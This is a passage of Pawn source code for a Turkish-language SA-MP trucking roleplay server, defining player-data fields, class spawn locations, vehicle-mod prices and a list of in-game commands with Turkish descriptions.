	Float:PreviousX, // Holds the previous X location of the player (used to detect airbreak hacks)
	Float:PreviousY, // Holds the previous Y location of the player (used to detect airbreak hacks)
	Float:PreviousZ, // Holds the previous Z location of the player (used to detect airbreak hacks)
	PreviousInt, // Holds the previous interior id (used to detect F hacks)

	StatsTruckerJobs, // Holds the number of succesfully completed trucker-missions
	StatsConvoyJobs, // Holds the number of completed trucking-routes when in a convoy
	StatsBusDriverJobs, // Holds the number of completed busroutes
	StatsDolmusDriverJobs,
	StatsPilotJobs, // Holds the number of completed pilot-missions
	StatsMafiaJobs, // Holds the number of completed mafia-missions
	StatsMafiaStolen, // Holds the number of succesfully deliveries of stolen mafialoads
	StatsPoliceFined, // Holds the number of fined players for police
	StatsPoliceJailed, // Holds the number of jailed players for police
	StatsFBYFined, // Holds the number of fined players for FBY
	StatsFBYJailed, // Holds the number of jailed players for FBY
	StatsRoadworkerJobs, // Holds the number of completed roadworker jobs
	StatsGemiciJobs, // Holds the number of completed gemici jobs
	StatsOduncuJobs, // Holds the number of completed oduncu jobs
	StatsCopcuJobs, // Holds the number of completed Gunoier-missions
	StatsBankaJobs, // Holds the number of completed Gunoier-missions
	StatsFireJobs, // Holds the number of completed Gunoier-missions
	StatsPboyJobs, // Holds the number of completed Pizza Boy-jobs
	StatsKargocuJobs,
	StatsBalikciJobs, // Holds the number of completed balikci jobs
	Float:StatsMetersDriven, // Holds the total kilometers that the player has driven already

	Text:SpeedometerText, // The TextDraw of the speedometer for this player
	Text:FuelGauge, // The textdraw of the fuel-gauge for this player
	SpeedometerTimer, // Holds the reference to the speedometer timer for this player
	PlayerSpeed, // Holds the speed of the player
	PlayerCaughtSpeeding, // This holds a value to prevent being caught multiple times by the same speedcamera

	Timer_PoliceCanJailMe, // This holds a reference to the timer which is started when the player got warned by a police player
	Value_PoliceCanJailMe, // This holds the remaining time for the Timer_PoliceCanJailPlayer timer
	bool:PoliceCanJailMe, // This holds "true" when the player was warned by a police player but didn't stop before the timer ran out
	bool:PoliceWarnedMe, // This holds "true" is the player got caught by a police player and got at least one warning

	Timer_FBYCanJailMe, // This holds a reference to the timer which is started when the player got warned by a FBY player
	Value_FBYCanJailMe, // This holds the remaining time for the Timer_FBYCanJailPlayer timer
	bool:FBYCanJailMe, // This holds "true" when the player was warned by a police player but didn't stop before the timer ran out
	bool:FBYWarnedMe, // This holds "true" is the player got caught by a FBY player and got at least one warning

	bool:JobStarted, // States that the player has started a job or not
	//Text:MissionText, // Displays the mission info at the bottom of the screen
	JobID, // Mission ID of the job (in the appropriate array, based on the PlayerClass), not used by truckers
	JobStep, // Current step of the job (for trucker: 1 = going to load, 2 = delivering goods to destination)
	PlayerCheckTimer, // A special timer used by certain classes (police, mafia) to check players every second if they're wanted/carrying mafialoads
	LoadingTimer, // The timer used for loading and unloading during jobs
	VehicleTimerTime, // Holds the remaining seconds for the global vehicletimer
	VehicleID, // Holds the ID of the vehicle that the player is driving during his job
	TrailerID, // Holds the ID of the trailer that the player has attached during his job (is 0 if no trailer attached)
	LoadID, // Holds the ID of the load
	JobLoc1, // Holds the LocationID where to pickup the load (used in trucking missions)
	JobLoc2, // Holds the LocationID where to deliver the load (used in trucking missions)
	bool:Overloaded, // Holds True if the player's vehicle is overloaded (wanted level increases by 2)
	bool:MafiaLoad, // Holds True is the player's load is wanted by the mafia
	bool:MafiaLoadHijacked, // Holds true if the mafia-player has hijacked a mafia-load
	bool:InConvoy, // Holds true if the player has joined a convoy already
	ConvoyID, // Holds the ID of the convoy where this player is a member
	DialogFirstItem, // Holds the first array-index where a split dialog must start
	DialogCarFirstCar, // Holds the first array-index where the carlist should start when the player asks to choose a car to spawn ("/car")
	DialogPlaneFirstPlane, // Holds the first array-index where the planelist should start when the player asks to choose a plane to spawn ("/plane")
	DialogTrailerFirstTrailer, // Holds the first array-index where the trailerlist should start when the player asks to choose a trailer to spawn ("/trailer")

    Passengers,
    
    LastMesleks[128],
    

    PboyHouses[11], // This holds up to 10 HouseID's for use during Pizza Boy-missions
	PboyMaxStep, // This holds the max number of houses to deliver packages to

	DialogRentVClass, // Holds the ID of the chosen vehicle class to process when renting a vehicle
	DialogRentCarIndex, // Holds the index in the ABuyableVehicles array which vehicle the player chose to rent
	DialogBuyVClass, // Holds the ID of the chose vehicle class to process when buying a vehicle
	DialogBuyCarIndex, // Holds the index in the ABuyableVehicles array which vehicle the player chose to buy

	DialogGetCarHouseID, // Holds the HouseID from which to get a vehicle when using /getcar

	DialogOtherPlayer, // Holds the id of the other player when viewing that other player's stats
	DialogOtherPlayerHouse, // Holds the HouseID of the other player when viewing the stats for that house

	RentedVehicleID, // Holds the vehicle-id of the rented vehicle (if any)
	Language,
	playerMail[128]
}

// Create an array to hold the playerdata for every player
new APlayerData[MAX_PLAYERS][TPlayerData];
new Evlerii[MAX_PLAYERS][LIMIT_PER_PLAYER];

#define MaxYanlisSifreHak 3
enum PlayerData
{
    pSifreHak,
	pKGun,
	pKAy,
	pKYil,
	pSGun,
	pSAy,
	pSYil,
	pOSaniye,
	pODakika,
	pOSaat,
	pOGun
};

new bugBildirdi[MAX_PLAYERS];

new pInfo[MAX_PLAYERS][PlayerData];

new bool:Musait[MAX_PLAYERS];

new ParaVerTimer[MAX_PLAYERS],
	BParaVerTimer[MAX_PLAYERS];

// Setup all the fields for a spawnlocation
enum TSpawnLocation
{
	Float:SpawnX,
	Float:SpawnY,
	Float:SpawnZ,
	Float:SpawnAngle
}
// Setup spawnlocations for each class (when selecting "Spawn" at class-selection, a random spawnlocation is selected)
new ASpawnLocationsTrucker[][TSpawnLocation] =
{
	{-525.0, -502.0, 26.0, 0.0}, // Fallen Tree Depot
	{-74.7, -1137.5, 4.5, 0.0}, // Flint Trucking Depot
	{1457.0, 975.5, 11.0, 0.0}, // Las Venturas
	{-2136.0, -247.5, 36.5, 270.0}, // Doherty Depot
	{1766.5, -2040.7, 14.0, 270.0}, // El Corona Depot
	{-546.0, 2594.0, 54.0, 270.0}, // Las Payasdas Depot
	{332.0, 900.0, 25.0, 205.0}, // Quarry
	{-1575.0, -2724.0, 49.0, 146.0}, // Shady Creek Depot
    {-933.2517, 738.0255, 24.6691} // tugis truck stop
};
new ASpawnLocationsBusDriver[][TSpawnLocation] =
{
	{1762.15, -1888.55, 13.55}, // Los Santos Otogar
	{-1714.41,  -78.57,  3.55}, // San Fierro Otogar
	{1497.07,  757.35, 10.82}, // Las Venturas Otogar
	{-1575.0, -2724.0, 49.0, 146.0} // Higway ( Longway Otogar )
};
new ASpawnLocationsDolmusDriver[][TSpawnLocation] =
{
	{2160.77, -1790.74,   13.52}, // Los Santos Otogar
	{-2249.30,  546.77,   35.11}, // San Fierro Otogar
	{2893.34, 1880.55,   10.82} // Las Venturas Otogar
};
new ASpawnLocationsPboy[][TSpawnLocation] =
{
	{2099.26, -1807.86, 17.33, 270.0}, // Ls pizzarie
	{2067.2468, 2223.8120, 10.8203}, // Lv pizzarie
	{-1726.6477, 1360.1843, 7.1875} // sf pizzarie
};
new ASpawnLocationsPilot[][TSpawnLocation] =
{
	{2010.0, -2345.0, 13.6, 90.0}, // Los Santos airport
	{-1211.0, -105.0, 14.2, 135.0}, // San Fierro airport
	{1630.0, 1615.0, 10.9, 90.0}, // Las Venturas airport
	{-5439.8237,806.7692,45.8000} // Kastamonu International Airport
};
new ASpawnLocationsPolice[][TSpawnLocation] =
{
	{1568.5, -1693.5, 6.0, 180.0}, // Los Santos police station
	{-1590.0, 716.25, -5.0, 270.0}, // San Fierro police station
	{2275.0, 2460.0, 10.9, 90.0} // Las Venturas police station
};
new ASpawnLocationsFBY[][TSpawnLocation] =
{
	{334.96, -1519.41, 35.86, 180.0}, // Los Santos FBY Base
	{-2751.6650,-315.2282,7.1952, 0.0},
	{2275.0, 2460.0, 10.9, 90.0} // sf rescue
};
new ASpawnLocationsMafia[][TSpawnLocation] =
{
	{2822.5, 898.5, 10.8, 0.0}, // Mafia hideout
	{-2094.6711, -2282.2837, 30.6250, 0.0} //whetstone
};
new ASpawnLocationsRoadWorker[][TSpawnLocation] =
{
	{-1866.25, -1715.25, 22.7, 125.0} // Junkyard
};
new ASpawnLocationsCopcu[][TSpawnLocation] =
{
	{2195.9705, -1973.5106, 13.5589, 173.8875}, // LS Çöplük
	{-1858.25, -1519.08, 21.89, 125.0} // SF Çöplük
};
new ASpawnLocationsBanka[][TSpawnLocation] =
{
	{-2426.3179,537.8267,30.0781, 125.0} // Banka yeri
};
new ASpawnLocationsFire[][TSpawnLocation] =
{
	{1108.8541,-1211.7532,18.0437, 125.0}, // fire yeri LS
	{1775.4115,2065.1565,10.8203, 125.0} // fire yeri LV
};
new ASpawnLocationsGemici[][TSpawnLocation] =
{
	{2571.2776,-2576.5281,10.6500,267.4822}, // Los Santos Liman
	{-3087.5215,216.4761,7.6500,92.9791}, // San Fierro Liman
	{880.3694,616.7280,11.7172,200.1136}, // Las Venturas Liman
	{-3322.0332,2373.2634,11.9910,273.0} // Porto Tugay
};

new ASpawnLocationsOduncu[][TSpawnLocation] =
{
	{-531.5685,-96.2541,63.1055,33.2684} // The Panopticon
};

new ASpawnLocationsBalikci[][TSpawnLocation] =
{
	{2486.8254,-2716.2607,10.6500,180.7139}, // Los Santos Liman
	{-3005.3818,337.2886,7.6500,359.1949}, // San Fierro Liman
	{898.2403,649.9003,11.7172,278.4859} // Las Venturas Liman
};

new ASpawnLocationsKargocu[][TSpawnLocation] =
{
	{1818.85, -1388.44,   13.58}, // Ls Kargo
	{-2737.92, -924.88,    9.52} // Sf Kargo
};

forward busroutestoptimer(playerid);

// Setup an array that holds all prices for vehicle-components
new AVehicleModPrices[] =
{
	400, // ID 1000, Spoiler Pro								Certain Transfender cars
	550, // ID 1001, Spoiler Win								Certain Transfender cars
	200, // ID 1002, Spoiler Drag								Certain Transfender cars
	250, // ID 1003, Spoiler Alpha								Certain Transfender cars
	100, // ID 1004, Hood Champ Scoop							Certain Transfender cars
	150, // ID 1005, Hood Fury Scoop							Certain Transfender cars
	80, // ID 1006, Roof Roof Scoop								Certain Transfender cars
	500, // ID 1007, Sideskirt Right Sideskirt					Certain Transfender cars
	500, // ID 1008, Nitro 5 times								Most cars, Most planes and Most Helicopters
	200, // ID 1009, Nitro 2 times								Most cars, Most planes and Most Helicopters
	1000, // ID 1010, Nitro 10 times                 			Most cars, Most planes and Most Helicopters
	220, // ID 1011, Hood Race Scoop                			Certain Transfender cars
	250, // ID 1012, Hood Worx Scoop                			Certain Transfender cars
	100, // ID 1013, Lamps Round Fog                			Certain Transfender cars
	400, // ID 1014, Spoiler Champ                  			Certain Transfender cars
	500, // ID 1015, Spoiler Race                   			Certain Transfender cars
	200, // ID 1016, Spoiler Worx                   			Certain Transfender cars
	500, // ID 1017, Sideskirt Left Sideskirt       			Certain Transfender cars
	350, // ID 1018, Exhaust Upswept                			Most cars
	300, // ID 1019, Exhaust Twin                   			Most cars
	250, // ID 1020, Exhaust Large                  			Most cars
	200, // ID 1021, Exhaust Medium								Most cars
	150, // ID 1022, Exhaust Small								Most cars
	350, // ID 1023, Spoiler Fury                   			Certain Transfender cars
	50, // ID 1024, Lamps Square Fog							Certain Transfender cars
	1000, // ID 1025, Wheels Offroad							Certain Transfender cars
	480, // ID 1026, Sideskirt Right Alien Sideskirt			Sultan
	480, // ID 1027, Sideskirt Left Alien Sideskirt				Sultan
	770, // ID 1028, Exhaust Alien                      		Sultan
	680, // ID 1029, Exhaust X-Flow								Sultan
	370, // ID 1030, Sideskirt Left X-Flow Sideskirt    		Sultan
	370, // ID 1031, Sideskirt Right X-Flow Sideskirt   		Sultan
	170, // ID 1032, Roof Alien Roof Vent						Sultan
	120, // ID 1033, Roof X-Flow Roof Vent              		Sultan
	790, // ID 1034, Exhaust Alien								Elegy
	150, // ID 1035, Roof X-Flow Roof Vent						Elegy
	500, // ID 1036, SideSkirt Right Alien Sideskirt    		Elegy
	690, // ID 1037, Exhaust X-Flow								Elegy
	190, // ID 1038, Roof Alien Roof Vent						Elegy
	390, // ID 1039, SideSkirt Right X-Flow Sideskirt   		Elegy
	500, // ID 1040, SideSkirt Left Alien Sideskirt				Elegy
	390, // ID 1041, SideSkirt Right X-Flow Sideskirt   		Elegy
	1000, // ID 1042, SideSkirt Right Chrome Sideskirt			Broadway
	500, // ID 1043, Exhaust Slamin                     		Broadway
	500, // ID 1044, Exhaust Chrome								Broadway
	510, // ID 1045, Exhaust X-Flow								Flash
	710, // ID 1046, Exhaust Alien								Flash
	670, // ID 1047, SideSkirt Right Alien Sideskirt    		Flash
	530, // ID 1048, SideSkirt Right X-Flow Sideskirt			Flash
	810, // ID 1049, Spoiler Alien								Flash
	620, // ID 1050, Spoiler X-Flow                     		Flash
	670, // ID 1051, SideSkirt Left Alien Sideskirt     		Flash
	530, // ID 1052, SideSkirt Left X-Flow Sideskirt			Flash
	130, // ID 1053, Roof X-Flow								Flash
	210, // ID 1054, Roof Alien									Flash
	230, // ID 1055, Roof Alien									Stratum
	520, // ID 1056, Sideskirt Right Alien Sideskirt			Stratum
	430, // ID 1057, Sideskirt Right X-Flow Sideskirt			Stratum
	620, // ID 1058, Spoiler Alien								Stratum
	720, // ID 1059, Exhaust X-Flow								Stratum
	530, // ID 1060, Spoiler X-Flow								Stratum
	180, // ID 1061, Roof X-Flow								Stratum
	520, // ID 1062, Sideskirt Left Alien Sideskirt				Stratum
	430, // ID 1063, Sideskirt Left X-Flow Sideskirt			Stratum
	830, // ID 1064, Exhaust Alien								Stratum
	850, // ID 1065, Exhaust Alien								Jester
	750, // ID 1066, Exhaust X-Flow								Jester
	250, // ID 1067, Roof Alien									Jester
	200, // ID 1068, Roof X-Flow								Jester
	550, // ID 1069, Sideskirt Right Alien Sideskirt			Jester
	450, // ID 1070, Sideskirt Right X-Flow Sideskirt			Jester
	550, // ID 1071, Sideskirt Left Alien Sideskirt				Jester
	450, // ID 1072, Sideskirt Left X-Flow Sideskirt			Jester
	1100, // ID 1073, Wheels Shadow								Most cars
	1030, // ID 1074, Wheels Mega								Most cars
	980, // ID 1075, Wheels Rimshine							Most cars
	1560, // ID 1076, Wheels Wires								Most cars
	1620, // ID 1077, Wheels Classic							Most cars
	1200, // ID 1078, Wheels Twist								Most cars
	1030, // ID 1079, Wheels Cutter								Most cars
	900, // ID 1080, Wheels Switch								Most cars
	1230, // ID 1081, Wheels Grove								Most cars
	820, // ID 1082, Wheels Import								Most cars
	1560, // ID 1083, Wheels Dollar								Most cars
	1350, // ID 1084, Wheels Trance								Most cars
	770, // ID 1085, Wheels Atomic								Most cars
	100, // ID 1086, Stereo Stereo								Most cars
	1500, // ID 1087, Hydraulics Hydraulics						Most cars
	150, // ID 1088, Roof Alien									Uranus
	650, // ID 1089, Exhaust X-Flow								Uranus
	450, // ID 1090, Sideskirt Right Alien Sideskirt			Uranus
	100, // ID 1091, Roof X-Flow								Uranus
	750, // ID 1092, Exhaust Alien								Uranus
	350, // ID 1093, Sideskirt Right X-Flow Sideskirt			Uranus
	450, // ID 1094, Sideskirt Left Alien Sideskirt				Uranus
	350, // ID 1095, Sideskirt Right X-Flow Sideskirt			Uranus
	1000, // ID 1096, Wheels Ahab								Most cars
	620, // ID 1097, Wheels Virtual								Most cars
	1140, // ID 1098, Wheels Access								Most cars
	1000, // ID 1099, Sideskirt Left Chrome Sideskirt			Broadway
	940, // ID 1100, Bullbar Chrome Grill						Remington
	780, // ID 1101, Sideskirt Left `Chrome Flames` Sideskirt	Remington
	830, // ID 1102, Sideskirt Left `Chrome Strip` Sideskirt	Savanna
	3250, // ID 1103, Roof Convertible							Blade
	1610, // ID 1104, Exhaust Chrome							Blade
	1540, // ID 1105, Exhaust Slamin							Blade
	780, // ID 1106, Sideskirt Right `Chrome Arches`			Remington
	780, // ID 1107, Sideskirt Left `Chrome Strip` Sideskirt	Blade
	780, // ID 1108, Sideskirt Right `Chrome Strip` Sideskirt	Blade
	1610, // ID 1109, Rear Bullbars Chrome						Slamvan
	1540, // ID 1110, Rear Bullbars Slamin						Slamvan
	55, // ID 1111, Front Sign? Little Sign?					Slamvan         ???
	55, // ID 1112, Front Sign? Little Sign?					Slamvan         ???
	3340, // ID 1113, Exhaust Chrome							Slamvan
	3250, // ID 1114, Exhaust Slamin							Slamvan
	2130, // ID 1115, Front Bullbars Chrome						Slamvan
	2050, // ID 1116, Front Bullbars Slamin						Slamvan
	2040, // ID 1117, Front Bumper Chrome						Slamvan
	780, // ID 1118, Sideskirt Right `Chrome Trim` Sideskirt	Slamvan
	940, // ID 1119, Sideskirt Right `Wheelcovers` Sideskirt	Slamvan
	780, // ID 1120, Sideskirt Left `Chrome Trim` Sideskirt		Slamvan
	940, // ID 1121, Sideskirt Left `Wheelcovers` Sideskirt		Slamvan
	780, // ID 1122, Sideskirt Right `Chrome Flames` Sideskirt	Remington
	860, // ID 1123, Bullbars Bullbar Chrome Bars				Remington
	780, // ID 1124, Sideskirt Left `Chrome Arches` Sideskirt	Remington
	1120, // ID 1125, Bullbars Bullbar Chrome Lights			Remington
	3340, // ID 1126, Exhaust Chrome Exhaust					Remington
	3250, // ID 1127, Exhaust Slamin Exhaust					Remington
	3340, // ID 1128, Roof Vinyl Hardtop						Blade
	1650, // ID 1129, Exhaust Chrome							Savanna
	3380, // ID 1130, Roof Hardtop								Savanna
	3290, // ID 1131, Roof Softtop								Savanna
	1590, // ID 1132, Exhaust Slamin							Savanna
	830, // ID 1133, Sideskirt Right `Chrome Strip` Sideskirt	Savanna
	800, // ID 1134, SideSkirt Right `Chrome Strip` Sideskirt	Tornado
	1500, // ID 1135, Exhaust Slamin							Tornado
	1000, // ID 1136, Exhaust Chrome							Tornado
	800, // ID 1137, Sideskirt Left `Chrome Strip` Sideskirt	Tornado
	580, // ID 1138, Spoiler Alien								Sultan
	470, // ID 1139, Spoiler X-Flow								Sultan
	870, // ID 1140, Rear Bumper X-Flow							Sultan
	980, // ID 1141, Rear Bumper Alien							Sultan
	150, // ID 1142, Vents Left Oval Vents						Certain Transfender Cars
	150, // ID 1143, Vents Right Oval Vents						Certain Transfender Cars
	100, // ID 1144, Vents Left Square Vents					Certain Transfender Cars
	100, // ID 1145, Vents Right Square Vents					Certain Transfender Cars
	490, // ID 1146, Spoiler X-Flow								Elegy
	600, // ID 1147, Spoiler Alien								Elegy
	890, // ID 1148, Rear Bumper X-Flow							Elegy
	1000, // ID 1149, Rear Bumper Alien							Elegy
	1090, // ID 1150, Rear Bumper Alien							Flash
	840, // ID 1151, Rear Bumper X-Flow							Flash
	910, // ID 1152, Front Bumper X-Flow						Flash
	1200, // ID 1153, Front Bumper Alien						Flash
	1030, // ID 1154, Rear Bumper Alien							Stratum
	1030, // ID 1155, Front Bumper Alien						Stratum
	920, // ID 1156, Rear Bumper X-Flow							Stratum
	930, // ID 1157, Front Bumper X-Flow						Stratum
	550, // ID 1158, Spoiler X-Flow								Jester
	1050, // ID 1159, Rear Bumper Alien							Jester
	1050, // ID 1160, Front Bumper Alien						Jester
	950, // ID 1161, Rear Bumper X-Flow							Jester
	650, // ID 1162, Spoiler Alien								Jester
	450, // ID 1163, Spoiler X-Flow								Uranus
	550, // ID 1164, Spoiler Alien								Uranus
	850, // ID 1165, Front Bumper X-Flow						Uranus
	950, // ID 1166, Front Bumper Alien							Uranus
	850, // ID 1167, Rear Bumper X-Flow							Uranus
	950, // ID 1168, Rear Bumper Alien							Uranus
	970, // ID 1169, Front Bumper Alien							Sultan
	880, // ID 1170, Front Bumper X-Flow						Sultan
	990, // ID 1171, Front Bumper Alien							Elegy
	900, // ID 1172, Front Bumper X-Flow						Elegy
	950, // ID 1173, Front Bumper X-Flow						Jester
	1000, // ID 1174, Front Bumper Chrome						Broadway
	900, // ID 1175, Front Bumper Slamin						Broadway
	1000, // ID 1176, Rear Bumper Chrome						Broadway
	900, // ID 1177, Rear Bumper Slamin							Broadway
	2050, // ID 1178, Rear Bumper Slamin						Remington
	2150, // ID 1179, Front Bumper Chrome						Remington
	2130, // ID 1180, Rear Bumper Chrome						Remington
	2050, // ID 1181, Front Bumper Slamin						Blade
	2130, // ID 1182, Front Bumper Chrome						Blade
	2040, // ID 1183, Rear Bumper Slamin						Blade
	2150, // ID 1184, Rear Bumper Chrome						Blade
	2040, // ID 1185, Front Bumper Slamin						Remington
	2095, // ID 1186, Rear Bumper Slamin						Savanna
	2175, // ID 1187, Rear Bumper Chrome						Savanna
	2080, // ID 1188, Front Bumper Slamin						Savanna
	2200, // ID 1189, Front Bumper Chrome						Savanna
	1200, // ID 1190, Front Bumper Slamin						Tornado
	1040, // ID 1191, Front Bumper Chrome						Tornado
	940, // ID 1192, Rear Bumper Chrome							Tornado
	1100, // ID 1193 Rear Bumper Slamin							Tornado
};


enum TCommands
{
	CommandLevel, // Holds the admin-level required to execute this command
	CommandStructure[128], // Holds the command-structure
	CommandDescription[128] // Holds the description of the command
};

new ACommands[][TCommands] =
{
	{0, "/work",														"Ýþbaþý yapmanýzý saðlar."},
	{0, "/rescue",                                                      "Týrlara ve dorselere ýþýnlanmanýzý saðlar."},
	{0, "/karakol",                                                     "Karakola ýþýnlanmanýzý saðlar."},
	{0, "/otomatikvites",                                               "Otomatik vites ile sürersiniz."},
	{0, "/otovites",                                                    "Otomatik vites ile sürersiniz."},
	{0, "/manuelvites",                                                 "Manuel vites ile sürersiniz."},
	{0, "/polisyazi",                                                   "Polis aracýnýn üstüne yazý yazmayý saðlar."},
	{0, "/basarimlar",                                                  "Baþarýmlar listesini görebilmenizi saðlar."},
	{0, "/akilitle",                                                    "Aracýnýzý kilitlemeye yarar."},
	{0, "/akilitac",                                                    "Aracýnýzýn kilidini açmaya yarar."},
	{0, "/kemer",                                                       "Araçta emniyet kemeri takmayý saðlar."},
	{0, "/tiryazi",                                                     "Týrýn üzerine yazý yazmayý saðlar."},
	{0, "/otobusyazi",                                                  "Otobüsün üzerine yazý yazmayý saðlar."},
	{0, "/ogorev <ID>",                                                 "Oyuncunun görevine bakmayý saðlar."},
	{0, "/yerbul <ID>",                                                 "Kiþiyi haritada yerini bulmasýný saðlar."},
	{0, "/sarkiac <ID>",                                                "Þarký açmanýzý saðlar."},
	{0, "/skapat",                                                      "Þarkýyý kapatýr."},
	{0, "/sac",                                                         "Sunucuda çalan þarkýyý açar."},
	{0, "/pm",                                                          "Kiþiye özel mesaj atmaya yarar."},
	{0, "/eval",                                                        "Ev almayý saðlar."},
	{0, "/icerigir",                                                    "Mülkün içeriye girilmesini saðlar."},
	{0, "/evmenu",                                                      "Ev menüsünü açar."},
	{0, "/getcar",                                                      "Aracýnýzý yanýnýza çaðýrýr."},
	{0, "/park",                                                        "Aracýnýzý park etmeye yarar."},
	{0, "/rentcar",                                                     "Araç kiralamasýný saðlayan komuttur."},
	{0, "/gohome",                                                      "Eve gitmeyi saðlar."},
	{0, "/gobus",                                                       "Ýþyerine gitmeyi saðlar."},
	{0, "/kasabirak",                                                   "Kasa býrakmayý saðlar."},
	{0, "/cevir",                                                       "Aracý düzeltmeye yarar."},
	{0, "/flip",                                                        "Aracý düzeltmeye yarar."},
	{0, "/kill",                                                        "Meslek seçimine gitmeyi saðlar."},
	{0, "/reclass",                                                     "Meslek seçimine gitmeyi saðlar."},
	{0, "/goreviptal",                                                  "Görevi iptal etmeyi saðlar."},
	{0, "/godonator",                                                   "Donatorluk aldýðýnýz mahalleye gitmeyi saðlar."},
	{0, "/paintjob",                                                    "Aracýnýza paintjob eklemeyi saðlar."},
	{0, "/arenk1",                                                      "Aracýnýzýn 1.rengini deðiþtirir."},
	{0, "/arenk2",                                                      "Aracýnýzýn 2.rengini deðiþtirir."},
	{0, "/admins",                                                      "Online adminleri gösterir."},
	{0, "/rehberler",                                                   "Online rehberleri gösterir."},
	{0, "/djler",                                                       "Online Dj'leri gösterir."},
	{0, "/vipler",                                                      "Online VIP'larý gösterir."},
	{0, "/yonetim",                                                     "Online ve offline adminleri gösterir."},
	{0, "/komutlar",                                                    "Komutlarý gösterir."},
	{0, "/convoy",                                                      "Konvoy menüsünü açar."},
	{0, "/convoybilgi",                                                 "Konvoy baþlamadan önce kasa kontrolü yapar."},
	{0, "/convoylider",                                                 "Konvoy liderini seçer."},
	{0, "/convoysifre",                                                 "Konvoya þifre ekler."},
	{0, "/convoysifrekaldir",                                           "Konvoy þifresini kaldýrýr."},
	{0, "/convoyat",                                                    "Konvoydan üye atar."},
	{0, "/convoyayril",                                                 "Konvoydan ayrýlýrsýnýz."},
	{0, "/convoyiptal",                                                 "Konvoy kapatýlýr."},
	{0, "/convoykontrol",                                               "Kimin yük alýp, almadýðýný belirler."},
	{0, "/convoyuye",                                                   "Konvoydaki üyeleri gösterir."},
	{0, "/c",                                                           "Konvoy chatte konuþmanýzý saðlar."},
	{0, "/bilgilerim",                                                  "Bilgilerinizi gösterir."},
	{0, "/stats",                                                       "Bilgilerinizi gösterir."},
	{0, "/asistan",                                                     "Aracý tamir eder."},
	{0, "/tamir",                                                       "Aracý tamir eder."},
	{0, "/afk",                                                         "AFK olursunuz."},
	{0, "/geldim",                                                      "AFK'dan çýkmayý saðlayan komuttur."},
	{0, "/buybus",                                                      "Ýþyeri almayý saðlar."},
	{0, "/isyerimenu",                                                  "Ýþyeri menüsünü açar."},
	{0, "/gobus",                                                       "Ýþyerine gitmenizi saðlar."},
	{0, "/paragonder",                                                  "Para göndermenizi saðlar."},
	{0, "/aractanat",                                                   "Kiþiyi araçtan atmanýzý saðlar."},
	{0, "/kurallar",                                                    "Kurallarý açmanýzý saðlar.(Küçük bir ödül vardýr.)"},
	{0, "/sikayet",                                                     "Oyuncuyu þikayet etmenizi saðlar."},
	{0, "/rapor",                                                       "Oyuncuyu þikayet etmenizi saðlar."},
	{0, "/report",                                                      "Oyuncuyu þikayet etmenizi saðlar."},
	{0, "/asiriyuk",                                                    "Aþýrý yük almanýzý saðlar."},
	{0, "/yardim",                                                      "Yardým menüsünü açmanýzý saðlar."},
	{0, "/sifredegistir",                                               "Þifrenizi deðiþtirmenizi saðlar."},
	{0, "/bonus",                                                       "Bonus göreve bakmaya yarar.(Sadece týrcý)"},
	{0, "/modifiye",                                                    "Aracýnýzý modifiye etmenizi saðlar."},
	{0, "/etkgit",                                                      "Etkinliðe katýlmanýzý saðlar."},
	{0, "/etkcik",                                                      "Etkinlikten çýkmanýzý saðlar."},
	{0, "/uyeal",                                                       "Þirkete üye almanýzý saðlar."},
	{0, "/srespawncars",                                                "Þirket araçlarýný spawnlamanýzý saðlar."},
	{0, "/sirket",                                                      "Þirket menüsünü açmanýzý saðlar."},
	{0, "/sirketdorse",                                                 "Þirket HQ'sunda dorse yaratmanýzý saðlar."},
	{0, "/sapark",                                                      "Þirket aracýný park etmenizi saðlar."},
	{0, "/yenilikler",                                                  "Yenilikleri görüntülemenizi saðlar."},
	{0, "/vipbilgi",                                                    "VIP bilgilerini görüntülemenizi saðlar."},
	{0, "/market",                                                      "VIP gibi þeyler kaç paraya satýldýðýna bakýlýr."},
	{0, "/donator",                                                     "Donator kaç paraya satýldýðý, ne iþe yaradýðýna bakýlýr."},
	{0, "/giseparacek",                                                 "Giþenizden para çekmeye yarar."},
	{0, "/odunsat",                                                     "Odunlarýnýzý satmaya yarar."},
	{0, "/baliksat",                                                    "Balýklarýnýzý satmaya yarar."},
	{0, "/kemer",                                                       "Kemerinizi takýp çýkartmaya yarar."},
	{0, "/l",                                                           "Yanýnýzdaki oyuncularla sohbet edeceðiniz komuttur."},
	{0, "/isimkapat",                                                   "Oyuncunun üzerinde yazan isimleri kapatýr."},
	{0, "/textkapat",                                                   "Textdrawlarý kapatmaya saðlayan komuttur."},
	{0, "/animlist",                                                    "Anim listesini açmaya yarar."},
	{0, "/ranklar",                                                     "Rütbeleri gösterir."},
	{0, "/pmoff",                                                       "PM'nizi kapatýr. Özel mesaj alamazsýnýz."},
	{0, "/pmon",                                                        "PM'nizi açar. Özel mesaj alabilirsiniz."},
	{0, "/sa",                                                          "Global chate Selamýn Aleyküm yazdýrýr."},
	{0, "/as",                                                          "Global chate Alyeküm Selam yazdýrýr."},
	{0, "/adminol",                                                     "Admin olmak isteyenlerin komutudur."},
	{0, "/vipol",                                                       "VIP olmayý isteyen komuttur."},
	{0, "/oldspeedo",                                                   "Eski speedometere geçiþ saðlar."},
	{0, "/cezaode",                                                     "Cezanýzý ödemeye yarar."},
	{0, "/fps",                                                         "FPS moduna geçiþ saðlar."},
	{0, "/mp3",                                                         "Þarký veya Radyo açmayý saðlar."},
	{0, "/bilet",                                                       "Trene binmek için bilet almayý saðlar."},
	{0, "/balon",                                                       "Jetpack balonu çýkartarak, uçmanýzý saðlar."},
	{0, "/kemerkontrol",                                                "Kemerinizin takýlý olup olmadýðýný sorgular."},
	{0, "! <mesaj>",                                                    "Þirket chatte konuþmanýzý saðlar."},
	{0, "/banka",                                                       "Banka menüsünü açmaya yarar."},
	{1, "/respawncars",                                                 "Tüm araçlarý re-spawnlar."},
	{1, "/duyuru",                                                      "Ekrana duyuru yapmak için kullanýlýr."},
	{1, "/asay",                                                        "Chatte ADMIN þeklinde yazý yazmanýzý saðlar."},
	{1, "/a",                                                           "Admin Chat konuþmasýdýr."},
	{1, "/cantazele",                                                   "Herkesin canlarýný doldurur."},
	{1, "/goto",                                                        "Oyuncuya ýþýnlanma komutudur."},
	{1, "/spec",                                                        "Oyuncu izleme komutudur."},
	{1, "/specoff",                                                     "Oyuncu izlemeyi býrakma komutudur."},
	{1, "/musait",                                                      "Adminin müsait olup olmadýðýný bildiren komuttur."},
	{1, "/d",                                                           "DJ Chattir."},
	{1, "/r",                                                           "Rehber Chattir."},
	{1, "/write",                                                       "Chatta baþýnda nickinizin olmadan direk yazma komutudur."},
